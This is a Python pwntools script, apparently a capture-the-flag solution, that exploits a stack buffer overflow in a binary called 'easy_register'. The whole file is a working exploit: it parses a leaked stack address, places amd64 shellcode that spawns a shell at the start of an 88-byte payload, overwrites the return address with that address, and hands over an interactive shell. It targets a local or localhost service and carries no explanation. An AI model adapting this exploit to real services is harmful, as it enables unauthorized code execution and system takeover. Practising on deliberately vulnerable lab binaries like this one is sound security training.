from pwn import *

elf = ELF('./easy_register')
context.arch = 'amd64'

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"b easy_register",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("localhost", 9001)
	else:
		return process(elf.path, env=env)

p = get_conn()

OFFSET = 88
# p.sendline(cyclic(200, n=8))

p.recvuntil(b'listing at 0x')

stack_addr = int(p.recvuntil(b'.', drop=True), 16)
print(f'[+] stack addr: {hex(stack_addr)}')


payload = asm(shellcraft.amd64.linux.sh())
payload += (OFFSET - len(payload)) * b'A'
payload += p64(stack_addr)
print(payload, len(payload))
p.sendlineafter(b'name >', payload)
p.interactive()
